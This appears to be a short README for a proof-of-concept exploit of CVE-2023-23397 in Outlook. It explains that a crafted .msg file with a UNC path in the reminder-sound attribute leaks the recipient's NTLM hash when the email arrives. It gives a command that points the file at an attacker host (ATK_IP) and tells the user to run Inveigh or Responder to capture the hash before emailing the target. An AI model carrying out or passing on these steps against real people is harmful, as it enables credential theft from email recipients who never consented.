# CVE-2023-23397 

Link for more details: https://github.com/Trackflaw/CVE-2023-23397

This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a .msg file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target.

### 1) Generate the .msg file

    CVE-2023-23397.py --path '\\ATK_IP\'

### 2) Before sending the email, run Inveigh/Responder to intercept the NTLM hash

### 3) VOILA!
